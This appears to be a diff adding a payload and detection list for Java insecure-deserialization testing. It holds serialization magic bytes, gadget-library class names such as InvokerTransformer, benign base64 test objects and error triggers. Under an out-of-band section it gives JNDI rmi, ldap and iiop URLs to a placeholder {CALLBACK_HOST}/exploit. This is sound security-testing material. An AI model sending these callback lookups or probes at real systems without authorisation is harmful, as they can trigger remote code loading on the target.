@@ -1,0 +1,94 @@
+# Insecure Deserialization - Java Gadget Markers
+# These are detection patterns and minimal payloads
+# Full gadget chains should be generated with ysoserial
+
+# ====================================
+# Magic Bytes Detection (Hex)
+# ====================================
+
+# Java Serialized Object magic bytes
+aced0005
+
+# Gzip-compressed Java object
+1f8b0800
+
+# ====================================
+# Magic Bytes Detection (Base64)
+# ====================================
+
+# Standard Java serialization
+rO0AB
+
+# ====================================
+# Common Gadget Library Markers
+# ====================================
+
+# Apache Commons Collections
+org.apache.commons.collections.Transformer
+org.apache.commons.collections.functors.InvokerTransformer
+org.apache.commons.collections.keyvalue.TiedMapEntry
+org.apache.commons.collections4.Transformer
+org.apache.commons.collections4.functors.InvokerTransformer
+
+# Spring Framework
+org.springframework.beans.factory.ObjectFactory
+org.springframework.transaction.jta.JtaTransactionManager
+org.springframework.aop.framework.AdvisedSupport
+
+# JBoss
+org.jboss.interceptor.proxy.InterceptorMethodHandler
+
+# Hibernate
+org.hibernate.engine.spi.TypedValue
+org.hibernate.tuple.component.AbstractComponentTuplizer
+
+# Groovy
+groovy.util.Expando
+org.codehaus.groovy.runtime.MethodClosure
+
+# BeanUtils
+org.apache.commons.beanutils.BeanComparator
+
+# C3P0
+com.mchange.v2.c3p0.WrapperConnectionPoolDataSource
+
+# Jackson
+com.fasterxml.jackson.databind.node.POJONode
+
+# ====================================
+# Minimal Detection Payloads (Base64)
+# ====================================
+
+# java.lang.String
+rO0ABXQABHRlc3Q=
+
+# java.util.HashMap
+rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABdAAEdGVzdHQABHRlc3R4
+
+# java.util.ArrayList  
+rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0eIHSHZnHYZ0DAAFJAARzaXpleHAAAAABdwQAAAABdAAEdGVzdHg=
+
+# java.util.HashSet
+rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAABA/QAAAAAAAAXQABHRlc3R4
+
+# ====================================
+# JNDI/RMI/LDAP Markers (for OOB)
+# ====================================
+
+# Replace {CALLBACK_HOST} with your server
+rmi://{CALLBACK_HOST}/exploit
+ldap://{CALLBACK_HOST}/exploit
+iiop://{CALLBACK_HOST}/exploit
+
+# ====================================
+# Error Trigger Payloads
+# ====================================
+
+# Truncated stream (triggers StreamCorruptedException)
+rO0AB
+
+# Invalid class (triggers ClassNotFoundException)
+rO0ABXNyABpub25leGlzdGVudC5jbGFzcy5OYW1lSGVyZQAAAAAAAAACAgAAeHA=
+
+# Invalid version
+rO0ABw==
